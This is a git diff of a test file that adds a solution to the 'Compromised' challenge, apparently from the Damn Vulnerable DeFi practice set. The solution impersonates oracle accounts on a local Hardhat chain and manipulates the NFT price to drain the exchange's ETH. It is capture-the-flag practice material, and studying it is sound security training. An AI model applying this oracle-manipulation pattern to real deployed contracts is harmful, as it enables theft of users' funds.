@@ -1,7 +1,7 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
 
-describe('Compromised challenge', function () {
+describe.only('Compromised challenge', function () {
 
     const sources = [
         '0xA73209FB1a42495120166736362A1DfA9F95A105',
@@ -59,23 +59,57 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+        for (let i = 0; i < 3; i++) {
+            await hre.network.provider.request({
+                method: "hardhat_impersonateAccount",
+                params: [sources[i]],
+            });
+            await this.oracle.connect(await ethers.getSigner(sources[i])).postPrice("DVNFT", 0);
+        }
+
+        await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.02") });
+        expect(await this.nftToken.balanceOf(attacker.address)).to.eq(1);
+
+        for (let i = 0; i < 3; i++) {
+            await hre.network.provider.request({
+                method: "hardhat_impersonateAccount",
+                params: [sources[i]],
+            });
+            await this.oracle.connect(await ethers.getSigner(sources[i])).postPrice(
+                "DVNFT",
+                await ethers.provider.getBalance(this.exchange.address)
+            );
+        }
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+        console.log("SOLD");
+
+        for (let i = 0; i < 3; i++) {
+            await hre.network.provider.request({
+                method: "hardhat_impersonateAccount",
+                params: [sources[i]],
+            });
+            await this.oracle.connect(await ethers.getSigner(sources[i])).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
         ).to.be.eq('0');
-        
+
         // Attacker's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Attacker must not own any NFT
         expect(
             await this.nftToken.balanceOf(attacker.address)
